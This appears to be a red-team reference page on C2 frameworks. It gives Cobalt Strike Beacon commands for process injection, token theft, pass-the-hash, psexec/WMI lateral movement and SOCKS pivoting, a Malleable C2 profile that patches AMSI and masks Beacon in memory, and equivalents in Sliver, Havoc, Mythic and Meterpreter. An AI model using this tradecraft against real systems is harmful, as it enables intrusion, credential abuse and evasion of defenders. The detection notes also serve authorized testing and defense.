# Red Team - C2 Frameworks

## Table of Contents
- [Operator's Mental Model](#operators-mental-model)
- [Cobalt Strike: Team Server](#cobalt-strike-team-server)
- [Cobalt Strike: Listeners](#cobalt-strike-listeners)
- [Cobalt Strike: Beacon (staged vs stageless)](#cobalt-strike-beacon-staged-vs-stageless)
- [Beacon Console: Command Set](#beacon-console-command-set)
- [Beacon: Process Injection & In-Memory Execution](#beacon-process-injection--in-memory-execution)
- [Beacon: Token & Credential Commands](#beacon-token--credential-commands)
- [Beacon: Lateral Movement (jump / remote-exec)](#beacon-lateral-movement-jump--remote-exec)
- [Beacon: Pivoting (SOCKS / rportfwd / link)](#beacon-pivoting-socks--rportfwd--link)
- [Malleable C2 Profile Structure](#malleable-c2-profile-structure)
- [Aggressor Scripts & BOFs](#aggressor-scripts--bofs)
- [Other Frameworks](#other-frameworks)
- [Concept to Command Map](#concept-to-command-map)
- [Peer-to-Peer C2 (no-egress internal hosts)](#peer-to-peer-c2-no-egress-internal-hosts)

For redirectors, domain fronting, C2 profiles at the infra layer, and DNS/HTTPS staging see [c2-infrastructure.md](c2-infrastructure.md). For getting the first payload to run see [initial-access.md](initial-access.md) and [payloads-and-execution.md](payloads-and-execution.md). For sleep masking, in-memory evasion, and BOF opsec see [edr-evasion.md](edr-evasion.md). For pivoting/proxying tradecraft beyond Beacon primitives see ../ctf-pivoting (see ctf-pivoting pack). For persistence and lateral-movement detail see [persistence-and-lateral.md](persistence-and-lateral.md).

---

## Operator's Mental Model

Observation first: most engagements fail on infrastructure and opsec, not on tooling. A framework is a control channel plus a post-ex toolkit. The operator questions are always the same regardless of framework: how does the implant reach me (listener/profile), how loud is each post-ex action (fork&run vs inline, new process vs current), and how do I reach hosts with no egress (peer-to-peer). Everything below is a variation on those three.

Framework choice is largely irrelevant to detection if tradecraft is bad; a default-profile Beacon or a default Sliver mTLS implant both burn instantly. Treat all example commands as authorized-engagement usage.

---

## Cobalt Strike: Team Server

`teamserver` is the server-side controller. Operators connect with the GUI client (or `aggressor`/headless). One team server = one C2 instance; scale with multiple servers behind redirectors.

```
# Start team server: <ext-IP> <shared-password> [C2-profile] [kill-date/YYYY-MM-DD]
./teamserver 10.0.0.5 SharedP4ss! c2-profiles/amazon.profile
# Client connects to team server IP:50050 with the shared password
```

- Port `50050/tcp` = client<->team-server (TLS). Change/firewall it; never expose 50050 to the internet — put listeners behind redirectors and keep 50050 to a management VPN/SSH tunnel.
- The team server holds the SSL cert used by HTTPS listeners; replace the default self-signed cert (see [c2-infrastructure.md](c2-infrastructure.md)) — the default cert hash is a known signature.
- Multiple operators share one team server (shared event log, shared Beacons, shared downloads).

---

## Cobalt Strike: Listeners

A listener = payload type + how Beacon reaches the controller. Two categories: **egress** (Beacon calls out to the internet/redirector) and **peer** (Beacon is reachable from another Beacon on the internal network).

| Listener | Type | Notes |
|---|---|---|
| `windows/beacon_http` | Egress HTTP | Plaintext C2 over HTTP; profile-shaped |
| `windows/beacon_https` | Egress HTTPS | TLS; needs valid cert on team server / redirector |
| `windows/beacon_dns` | Egress DNS | DNS A/AAAA/TXT tunneling; slow, survives egress filtering |
| `windows/beacon_bind_tcp` | Peer (bind) | Beacon listens on a TCP port; parent connects in |
| `windows/beacon_reverse_tcp` | Peer (reverse) | Beacon connects out to a peer on TCP |
| `windows/beacon_bind_pipe` (SMB) | Peer (named pipe) | Beacon listens on an SMB named pipe (`\\.\pipe\...`); linked over 445 |
| `windows/foreign/*` | Foreign | Hand off to Metasploit staged HTTP/HTTPS/TCP |
| External C2 | Custom | Third-party transport via ExternalC2 spec |

- DNS listener: set the DNS server records to point at the team server / redirector; TXT gives more bandwidth than A. Historically slow — used for resilience, not throughput.
- SMB and TCP listeners are **peer-to-peer**: they have no egress of their own. A Beacon with egress relays their traffic. See [peer-to-peer](#peer-to-peer-c2-no-egress-internal-hosts).

---

## Cobalt Strike: Beacon (staged vs stageless)

Beacon is the CS implant. Delivery is either **staged** (small stager downloads the full Beacon) or **stageless** (full Beacon in one artifact).

- **Staged**: tiny stager (e.g. `windows/beacon_http/reverse_http` stager) pulls the stage from a well-known URI. Smaller initial footprint but the stage-download is a strong, well-signatured detection point; many modern profiles/EDRs flag the checksum8 stager URIs. Prefer stageless where size allows.
- **Stageless**: complete payload (`beacon_https` in one PE/shellcode). Larger, but no second network fetch and no staging URI to signature. Default recommendation for most delivery.
- Artifacts are produced by **Attacks -> Packages / Payloads**: `Windows Executable (S)` = stageless EXE/DLL, `Windows Stager`, raw shellcode (`payload.bin`), `PowerShell`, and **Artifact Kit** for AV-evadable loaders. `HTMLApplication`, `MS Office Macro`, `Scripted Web Delivery` are delivery wrappers.
- Beacon phones home on a **sleep** interval with **jitter**. `sleep 60 30` = 60s beacon, 30% jitter. `sleep 0` = interactive (loud, real-time).

---

## Beacon Console: Command Set

The commands operators actually type. All run inside a Beacon console. `help <cmd>` in-client for full syntax. Many post-ex commands run **fork&run** (spawn a sacrificial process, inject, run, collect) unless a `spawnto` / inline variant exists — fork&run is the single biggest CS detection surface.

```
# --- session control ---
sleep 5 20                 # 5s callback, 20% jitter
sleep 0                    # interactive / no delay (loud)
checkin                    # force a checkin
mode dns-txt               # switch DNS beacon channel (dns / dns-txt / dns6)
exit                       # ask beacon to exit

# --- host recon (built-ins, quiet-ish) ---
pwd / cd / ls / ps / getuid / whoami
shell whoami /all          # spawns cmd.exe /c (LOUD: child of beacon host proc)
run net user               # runs binary directly via CreateProcess (no cmd.exe)
powershell Get-Process     # runs via powershell.exe (loud; AMSI-logged)
powerpick Get-Process      # unmanaged PowerShell, no powershell.exe (patches AMSI/ETW)
psinject <pid> <listener>  # inject powerpick runspace into target pid

# --- process control ---
spawn <listener>           # spawn a NEW beacon in a sacrificial process (fork&run target)
spawnto x64 %windir%\sysnative\dllhost.exe   # set the sacrificial process for fork&run/spawn
spawnu <pid> <listener>    # spawn beacon as child of another process (parent PID spoof)
inject <pid> <arch> <listener>   # inject a beacon into an existing process
dllload <pid> <dll>        # load a DLL into a process

# --- privilege ---
getsystem                  # impersonate SYSTEM via named-pipe/token trick (loud)
elevate <exploit> <listener>   # run a local privesc exploit kit module
runasadmin <exploit> <cmd>     # UAC bypass to run a command elevated

# --- file ops ---
upload / download / mkdir / rm / cp / mv
```

Notes: `shell` is CreateProcess of `cmd.exe /c` — a classic child-process tell. Prefer `run` (direct exec, no shell) or a BOF. `powershell` writes to disk-adjacent telemetry and hits AMSI/ETW; `powerpick`/`psinject` use an unmanaged runspace and patch AMSI/ETW in-process (see [edr-evasion.md](edr-evasion.md)).

---

## Beacon: Process Injection & In-Memory Execution

The .NET / BOF / shellcode execution primitives — the modern operator's core toolset.

```
execute-assembly /path/Rubeus.exe kerberoast    # run a .NET assembly IN MEMORY (fork&run)
inline-execute /path/bof.o [args]               # run a Beacon Object File in-process (NO new process)
inlineExecute-Assembly ...                       # (BOF-based CLR host; community, not built-in — mark)
shinject <pid> <arch> <shellcode.bin>            # inject raw shellcode into a pid
dllinject <pid> <dll>                            # reflective DLL injection into a pid
```

- `execute-assembly` runs a managed EXE in a **sacrificial fork&run process** — loads the CLR, which is loud (CLR load events, `clr.dll` in an unexpected process). Great capability, high signal. Keep assemblies small and consider inline BOF equivalents (e.g. `inline-execute` of a roasting BOF instead of `execute-assembly Rubeus.exe`).
- `inline-execute` runs a **BOF (Beacon Object File)** inside the Beacon process itself — no new process, no CLR, minimal footprint. This is the preferred path for recon/lateral BOFs. See [Aggressor & BOFs](#aggressor-scripts--bofs).
- `process-inject` behavior (which API, which spawnto) is governed by the **Malleable C2 `process-inject` block**, not per-command flags. Tune it there.

---

## Beacon: Token & Credential Commands

```
make_token DOMAIN\user Passw0rd!   # create a LOGON_NEW_CREDENTIALS impersonation token (network auth only)
steal_token <pid>                  # duplicate & impersonate the token of another process
rev2self                           # drop the impersonation token, revert to Beacon's own token
getuid                             # show current token identity (verify after make/steal)
pth DOMAIN\user <NTLMHASH>         # pass-the-hash via mimikatz sekurlsa::pth (spawns/patches LSASS-backed logon)
kerberos_ticket_use /path/tkt.kirbi   # inject a Kerberos ticket (.kirbi) into current logon session (PTT)
kerberos_ccache_use /path/tkt.ccache  # inject a ccache-format ticket (Linux-tool output)
kerberos_ticket_purge              # purge all Kerberos tickets from the current session
```

- `make_token` creates a **network-only** token: it changes who you are *to remote hosts* (SMB/WinRM), not local actions. Verify with `getuid`; it shows the impersonated user but the process still runs as the original — this is expected. (Ref: NCC "Demystifying make_token".)
- **overpass-the-hash / pass-the-key** is not a single Beacon verb: request a TGT with Rubeus via `execute-assembly Rubeus.exe asktgt /user:.. /rc4:<hash>` (or `/aes256:`), then `kerberos_ticket_use` the resulting `.kirbi`. See ../ctf-ad/kerberos.md (see ctf-ad pack, `kerberos.md`).
- `pth` invokes mimikatz `sekurlsa::pth` — it patches a spawned logon session with the NT hash; touches LSASS and is a strong EDR trigger.
- Uncertain/version-dependent: the exact command name for a raw NTLM PTT vs Kerberos differs; `pth` = NTLM hash, `kerberos_ticket_use` = ticket. There is **no** `kerberos_ticket_pass` command — the verb is `kerberos_ticket_use`.

For where the tickets/hashes come from (Kerberoast, AS-REP, DCSync, delegation) see ../ctf-ad/kerberos.md (see ctf-ad pack, `kerberos.md`) and ../ctf-ad/credential-access.md (see ctf-ad pack, `credential-access.md`).

---

## Beacon: Lateral Movement (jump / remote-exec)

Two families. `jump` drops a **new Beacon** on the target (needs a listener). `remote-exec` runs **one command** on the target (no Beacon). Both use the **current token** (so `make_token`/`steal_token`/PTT first).

```
jump <method> <target> <listener>
   psexec      # x86 Service EXE via SCM (creates a service, runs Service EXE artifact)
   psexec64    # x64 Service EXE via SCM
   psexec_psh  # service runs a PowerShell one-liner (no EXE artifact on disk)
   winrm       # x86 PowerShell payload over WinRM (5985/5986)
   winrm64     # x64 PowerShell payload over WinRM

remote-exec <method> <target> <command>
   psexec      # SCM: create+start a service whose binPath is the command
   winrm       # run command via WinRM (PowerShell)
   wmi         # run command via WMI (Win32_Process Create)
```

- `jump psexec/psexec64` creates a Windows service on the target (random service name) that launches a Service EXE artifact -> spawns a Beacon linked back. Classic 7045 service-install event.
- `jump winrm` launches `powershell.exe` on the target over WinRM.
- `remote-exec wmi` uses WMI `Win32_Process::Create` — **no service, no new Beacon**; use it to fire a one-liner (e.g. to bootstrap an SMB Beacon). (Historically `psexec_psh` was the built-in WMI-adjacent option; `remote-exec wmi` runs a raw command.)
- `psexec_psh` avoids dropping an EXE (service runs a PowerShell command instead) — lower disk footprint, still a service-install event.
- Detection footprint and impacket/nxc equivalents: see [persistence-and-lateral.md](persistence-and-lateral.md) and ../ctf-ad/lateral-movement.md (see ctf-ad pack, `lateral-movement.md`).

---

## Beacon: Pivoting (SOCKS / rportfwd / link)

```
socks 1080                 # start a SOCKS4a proxy on the team server, tunneled through this Beacon
socks 1080 socks5 disableNoAuth user pass   # SOCKS5 with user/pass auth (newer CS)
socks stop
rportfwd 8080 10.0.0.9 80   # reverse port fwd: target:8080 -> (via team server) -> 10.0.0.9:80
rportfwd stop 8080
portscan 10.0.0.0/24 1-1024,3389 arp   # built-in port scan (arp/icmp/none discovery)
connect <target> <port>    # connect to a TCP-bind peer Beacon
link <target> [pipename]   # connect to an SMB-named-pipe peer Beacon
unlink <target>            # detach a linked peer Beacon
```

- `socks` gives a tunnel for proxychains/impacket/nxc through Beacon into the internal net; combine with `make_token` for authed access. Bandwidth is bounded by the sleep time — set `sleep 0` while proxying interactively.
- `rportfwd` bounces a target-side listener back through the team server (e.g. to catch a relay/coerced auth on an internal host with no route to you).
- `link`/`unlink` (SMB) and `connect` (TCP) manage the peer-to-peer Beacon graph — see below.

For proxychains, SSH pivots, and non-CS tunneling see ../ctf-pivoting (see ctf-pivoting pack) and [c2-infrastructure.md](c2-infrastructure.md).

---

## Malleable C2 Profile Structure

The profile shapes Beacon traffic and post-ex behavior. Bad/default profiles are the #1 CS burn. Structure:

```
# --- global options ---
set sleeptime "45000";
set jitter    "37";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...";
set sample_name "amazon.profile";

# --- how GET traffic (beacon callback) looks ---
http-get {
    set uri "/s/ref=nb_sb_noss_1/";
    client {
        header "Accept" "*/*";
        metadata {                # where the beacon session metadata hides
            base64url;
            prepend "session-token=";
            header "Cookie";
        }
    }
    server {
        header "Content-Type" "text/html;charset=UTF-8";
        output {                  # how tasking/output is wrapped
            base64;
            print;
        }
    }
}

# --- how POST traffic (larger uploads/output) looks ---
http-post {
    set uri "/N4215/adj/amzn.us.sr.aps";
    client { id { ... } output { ... } }
    server { output { ... } }
}

# --- staging block (only relevant if using staged payloads) ---
http-stager {
    set uri_x86 "/ca";
    set uri_x64 "/cd";
    client { ... }
    server { ... }
}

# --- post-exploitation behavior ---
post-ex {
    set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
    set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
    set obfuscate   "true";     # obfuscate post-ex DLL in memory
    set smartinject "true";
    set amsi_disable "true";    # patch AMSI in fork&run post-ex
    set pipename    "mojo.%x.%x";  # named-pipe naming for post-ex jobs
}

# --- process injection behavior ---
process-inject {
    set allocator "NtMapViewOfSection";
    set startrwx  "false";                # initial page perms (avoid RWX at alloc)
    set userwx    "false";                # final page perms (avoid RWX)
    transform-x64 { prepend "\x90\x90"; }
    execute { CreateThread "ntdll!RtlUserThreadStart"; NtQueueApcThread-s; SetThreadContext; RtlCreateUserThread; }
}

# --- sleep mask / stage (in-memory footprint of Beacon itself) ---
stage {
    set obfuscate "true";
    set cleanup   "true";       # free staging memory after load
    set userwx    "false";
    set sleep_mask "true";      # encrypt beacon in memory while sleeping
    set module_x64 "wininet.dll";
    transform-x64 { strrep "ReflectiveLoader" ""; strrep "beacon.dll" ""; }
}
```

- `http-get`/`http-post` `client`/`server` blocks with `metadata`/`id`/`output` transforms (append/prepend/base64/base64url/mask/netbios/print, header/parameter/uri-append) define exactly how C2 data is encoded and where it hides. Match a real application's traffic.
- `post-ex` sets `spawnto` (fork&run sacrificial proc — pick something plausible, never rundll32 with no args), AMSI/ETW patching, and pipe names.
- `process-inject` governs `inject`/`spawn`/`execute-assembly` allocation & thread-start APIs — tune away from RWX and from signatured defaults.
- `stage` controls Beacon's in-memory image (sleep-mask, string removal). Validate with `c2lint <profile>` before use.

See [c2-infrastructure.md](c2-infrastructure.md) for pairing profiles with redirector rules and [edr-evasion.md](edr-evasion.md) for sleep-mask/evasion detail.

---

## Aggressor Scripts & BOFs

- **Aggressor Script** (`.cna`): CS's scripting language (Sleep/Perl-like). Adds console aliases, popup menus, auto-tasking, and registers new commands. Loaded via **Script Manager**. Used to wire community tooling (e.g. a `.cna` that adds a `roast` alias which runs an `inline-execute` BOF). Runs client-side, tasks Beacons via `beacon_command_register` / `bexecute_assembly` / `binline_execute`.
- **BOF (Beacon Object File)**: a small COFF object (compiled C, `.o`) that runs **inside the Beacon process** via `inline-execute` — no fork&run, no new process, no CLR. Uses the Beacon API (`BeaconPrintf`, `BeaconDataParse`, dynamic function resolution). This is the modern low-footprint execution model; huge community library (TrustedSec `CS-Situational-Awareness-BOF`, `nanodump`, `bof-collection`).
- Prefer BOFs over `execute-assembly` for recon/lateral where a BOF exists — no CLR load, far quieter. Reserve `execute-assembly` for .NET-only tooling (Rubeus, SharpHound, Certify).

---

## Other Frameworks

Brief operator equivalents. Same three questions (channel, footprint, egress) apply.

- **Sliver** (BishopFox, Go): implants generated per-op, mTLS/HTTP(S)/DNS/WireGuard C2. `generate --mtls <host> --os windows`, `implants`, `use <session>`. **Armory** = extension/alias package manager (`armory install <name>`) — installs BOF-style extensions and .NET aliases. `execute-assembly`, `sideload` (host a shared lib), `psexec`, `portfwd`/`socks5`, `pivots tcp`/`pivots named-pipe` for peer-to-peer. Free, open-source; strong for smaller ops.
- **Havoc** (C4/Go, open source): the **Demon** agent. Sleep obfuscation (Ekko/Zilean) and indirect syscalls built in. `dotnet inline-execute` / `dotnet execute-assembly`, `inject`, `token make`/`token steal`, `socks`. Community profiles; default profiles are increasingly signatured.
- **Mythic** (open source, Docker): a C2 *framework of frameworks* — multiple **agents** (Apollo=.NET/Windows, Poseidon=Go/cross-platform, Merlin, etc.) and pluggable **C2 profiles** (http, dynamichttp, websocket, smb) as separate containers. Web UI. Apollo mirrors Beacon closely (`execute_assembly`, `inject`, `make_token`, `steal_token`, `jump_psexec`, `socks`).
- **Metasploit / Meterpreter** (comparison baseline): `getsystem`, `migrate <pid>`, `load kiwi`, `portfwd`, `route add` + `auxiliary/server/socks_proxy`, `psexec` module, `run post/...`. Loud and heavily signatured; useful for exploitation and as a foreign listener target, not for stealthy long-haul C2.

Version note: framework command names drift between releases — verify against the current build's help before relying on any exact verb.

---

## Concept to Command Map

| Concept | Cobalt Strike | Sliver | Havoc (Demon) | Mythic (Apollo) | Meterpreter |
|---|---|---|---|---|---|
| Spawn new session in proc | `spawn` / `spawnto` | `execute --spawn` (via profile) | `spawn` | `spawn` | `execute -H` |
| Inject into existing PID | `inject <pid>` / `shinject` | `migrate` / `execute-shellcode` | `inject` | `inject` | `migrate <pid>` |
| Steal/impersonate token | `steal_token <pid>` | `impersonate` / `getsystem` | `token steal` | `steal_token` | `steal_token <pid>` |
| Make network token | `make_token DOM\u pass` | `make-token` | `token make` | `make_token` | (n/a; use `getsystem`/incognito) |
| SOCKS proxy | `socks 1080` | `socks5 start` | `socks` | `socks` | `socks_proxy` aux module |
| Peer over SMB pipe | `link` (+SMB listener) | `pivots named-pipe` | SMB agent link | `link` (smb profile) | (pipe pivot via named_pipe) |
| Run .NET in memory | `execute-assembly` | `execute-assembly` | `dotnet execute-assembly` | `execute_assembly` | `execute -f` (via post) |
| Lateral psexec | `jump psexec64` | `psexec` | (service module) | `jump_psexec` | `exploit/.../psexec` |

Cells are functional equivalents, not identical flags — check each build's help.

---

## Peer-to-Peer C2 (no-egress internal hosts)

Internal hosts frequently have **no route to the internet**. You still need C2 on them. Solution: a peer-to-peer Beacon that talks to an **already-controlled egress Beacon**, which relays over its own channel.

- **SMB Beacon**: listens on a **named pipe** (`\\.\pipe\<name>`), reachable over **445/tcp** (SMB). No egress of its own. Deploy with an SMB listener, then `link <target> <pipename>` from an egress Beacon to bind them; `unlink` to detach. Traffic rides the existing SMB session — blends with normal Windows admin traffic; the named-pipe name is a tell, so set a realistic `pipename` in the profile (`post-ex -> pipename`).
- **TCP Beacon**: bind (`beacon_bind_tcp` — target listens, parent `connect`s in) or reverse (`beacon_reverse_tcp`). Arbitrary port; use where SMB is filtered but internal TCP is open. `connect <target> <port>` / `unlink`.
- Topology: `[operator] <- HTTPS -> [egress Beacon on DMZ box] <- SMB/TCP -> [SMB Beacon on locked-down server] <- SMB -> [next hop]`. Deep chains work but each hop adds latency (bounded by each link's sleep).
- Deliver the peer payload with `remote-exec wmi`/`jump psexec` (which run in the target's context and link back automatically for SMB), or drop+run a peer artifact via a `jump` method that targets a peer listener.

For non-Beacon tunneling (chisel, ligolo-ng, ssh, proxychains) and route management see ../ctf-pivoting (see ctf-pivoting pack). For the redirector/egress side see [c2-infrastructure.md](c2-infrastructure.md).
